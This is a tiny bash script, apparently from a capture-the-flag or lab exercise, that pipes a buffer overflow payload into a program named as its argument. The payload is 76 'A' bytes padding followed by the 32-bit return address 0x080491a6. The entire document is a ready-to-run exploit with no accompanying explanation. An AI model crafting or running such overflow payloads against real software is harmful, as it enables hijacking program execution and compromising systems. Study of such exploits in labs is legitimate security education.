#!/bin/bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\xa6\x91\x04\x08')"| $1 #add directory of file on your system

